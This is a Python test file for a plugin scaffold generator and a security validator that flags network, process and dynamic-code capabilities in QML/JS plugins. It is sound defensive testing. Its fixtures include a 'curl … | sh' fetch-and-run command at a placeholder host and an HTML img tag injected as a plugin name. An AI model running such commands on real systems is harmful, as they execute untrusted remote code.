from __future__ import annotations

import json
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
GENERATOR = REPO / 'skills/omarchy-plugin-scaffold/scripts/new_plugin.py'
VALIDATOR = REPO / 'skills/omarchy-plugin-test/scripts/validate_plugin.py'


class ArchitecturePolicyTests(unittest.TestCase):
    def setUp(self):
        self.temporary = tempfile.TemporaryDirectory()
        self.addCleanup(self.temporary.cleanup)
        self.root = Path(self.temporary.name) / 'plugin'
        result = subprocess.run([
            sys.executable, str(GENERATOR), '--id', 'io.github.example.policy',
            '--name', '<img src="https://example.invalid/pixel">',
            '--kind', 'panel', '--kind', 'menu', '--kind', 'overlay',
            '--output', str(self.root), '--no-git',
        ], capture_output=True, text=True)
        self.assertEqual(result.returncode, 0, result.stderr)

    def validate(self, *args):
        result = subprocess.run([sys.executable, str(VALIDATOR), '--json', *args,
                                 str(self.root)], capture_output=True, text=True)
        return result, json.loads(result.stdout)

    def test_generated_external_text_sinks_are_literal(self):
        # This checks generated source, not Qt rendering or network behavior.
        for name in ('Panel.qml', 'Menu.qml', 'Overlay.qml'):
            source = (self.root / name).read_text()
            self.assertEqual(source.count('Text {'), source.count('textFormat: Text.PlainText'))
        result, data = self.validate('--deny-capability', 'qml-network',
                                     '--deny-capability', 'qml-dynamic-code')
        self.assertEqual(result.returncode, 0, data)

    def test_nested_js_direct_network_is_advisory_by_default(self):
        nested = self.root / 'helpers'
        nested.mkdir()
        (nested / 'transport.js').write_text('function fetchData() { return new XMLHttpRequest(); }\n')
        result, data = self.validate('--security')
        self.assertEqual(result.returncode, 0, data)
        self.assertIn('qml-network', [c['code'] for c in data['security']['capabilities']])
        self.assertEqual(data['projectPolicy']['deniedCapabilities'], [])
        result, data = self.validate('--deny-capability', 'qml-network')
        self.assertEqual(result.returncode, 1, data)
        self.assertIn('project-policy-qml-network', [e['code'] for e in data['errors']])
        self.assertEqual(data['security']['findings'], [])
        self.assertEqual(data['security']['outcome'], 'review-required')

    def test_policy_does_not_promote_unselected_advisory_findings(self):
        (self.root / 'example.sh').write_text('curl https://example.invalid/install | sh\n')
        result, data = self.validate('--deny-capability', 'qml-network')
        self.assertEqual(result.returncode, 0, data)
        self.assertIn('curl-pipe-shell', [f['code'] for f in data['security']['findings']])
        result, data = self.validate('--security', '--deny-capability', 'qml-network')
        self.assertEqual(result.returncode, 2, data)

    def test_each_supported_architecture_rule_can_fail(self):
        for code, source in (
            ('qml-dynamic-code', 'function makeCode() { return Qt.createQmlObject("Item {}", parent); }'),
            ('qml-collected-input', 'Item { FileView { path: "state.json" } }'),
            ('qml-process', 'Item { Process { command: ["true"] } }'),
            ('qml-network', 'function fetchData() { return new WebSocket("wss://example.invalid"); }'),
        ):
            with self.subTest(code=code):
                (self.root / 'Boundary.qml').write_text(source)
                result, data = self.validate('--deny-capability', code)
                self.assertEqual(result.returncode, 1, data)
                self.assertIn('project-policy-' + code, [e['code'] for e in data['errors']])

    def test_policy_fails_when_source_cannot_be_scanned(self):
        for payload in (b'\xff', b' ' * (2 * 1024 * 1024 + 1)):
            with self.subTest(size=len(payload)):
                (self.root / 'Unreadable.js').write_bytes(payload)
                result, data = self.validate('--deny-capability', 'qml-network')
                self.assertEqual(result.returncode, 1, data)
                self.assertIn('project-policy-unreadable', [e['code'] for e in data['errors']])

    def test_unknown_rule_is_rejected_and_rules_are_explicit(self):
        result = subprocess.run([sys.executable, str(VALIDATOR), '--deny-capability',
                                 'all', str(self.root)], capture_output=True, text=True)
        self.assertEqual(result.returncode, 2)
        self.assertIn('invalid choice', result.stderr)
        # Conservative lexical scope includes comments: do not claim a parser.
        (self.root / 'Comment.qml').write_text('// XMLHttpRequest is not used here\nItem {}\n')
        result, data = self.validate('--deny-capability', 'qml-network')
        self.assertEqual(result.returncode, 1, data)
        (self.root / 'Comment.qml').unlink()
        result, data = self.validate('--deny-capability', 'qml-network',
                                     '--deny-capability', 'qml-network')
        self.assertEqual(result.returncode, 0, data)
        self.assertEqual(data['projectPolicy']['deniedCapabilities'], ['qml-network'])
